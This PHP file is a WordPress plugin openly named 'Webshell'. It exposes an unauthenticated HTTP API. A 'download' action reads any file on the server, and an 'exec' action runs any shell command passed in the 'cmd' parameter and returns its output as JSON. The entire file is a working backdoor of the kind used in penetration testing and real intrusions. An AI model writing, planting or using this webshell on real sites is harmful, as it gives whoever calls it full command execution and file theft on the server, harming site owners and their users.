<?php
/*
Plugin Name: Webshell
Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
Description: A webshell API for WordPress.
Author: Remi Gascou (Podalirius)
Version: 1.1.0
Author URI: https://podalirius.net/
Text Domain: webshell
Domain Path: /languages
License: GPLv3 or later
Network: true
*/

$chunk_size = 1024;
$action = $_REQUEST["action"];

if ($action == "download") {
    $path_to_file = $_REQUEST["path"];

    if (file_exists($path_to_file)) {
        http_response_code(200);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($path_to_file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: '.filesize($path_to_file));
        flush();
        readfile($path_to_file);
        die();
    } else {
        http_response_code(404);
        header("Content-Type: application/json");
        echo json_encode(
            array(
                "message" => "Path " . $path_to_file . " does not exist or is not readable.",
                "path" => $path_to_file
            )
        );
    }

} elseif ($action == "exec") {
    $command = $_REQUEST["cmd"];

    // Spawn shell process
    $descriptorspec = array(
        0 => array("pipe", "w"),  // stdout is a pipe that the child will write to
        1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
        2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    chdir("/");
    $process = proc_open($command, $descriptorspec, $pipes);

    if (!is_resource($process)) {
        // Can't spawn process
        exit(1);
    }

    // Set everything to non-blocking
    // Reason: Occasionally reads will block, even though stream_select tells us they won't
    // stream_set_blocking($pipes[1], 0);
    // stream_set_blocking($pipes[2], 0);

    // If we can read from the process's STDOUT send data down tcp connection
    $stdout = ""; $buffer = "";
    do {
        $buffer = fread($pipes[1], $chunk_size);
        $stdout = $stdout . $buffer;
    } while ((!feof($pipes[1])) && (strlen($buffer) != 0));

    // If we can read from the process's STDOUT send data down tcp connection
    $stderr = ""; $buffer = "";
    do {
        $buffer = fread($pipes[2], $chunk_size);
        $stderr = $stderr . $buffer;
    } while ((!feof($pipes[2])) && (strlen($buffer) != 0));

    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    header('Content-Type: application/json');
    echo json_encode(
        array(
            'stdout' => $stdout,
            'stderr' => $stderr,
            'exec' => $command
        )
    );
}

?>
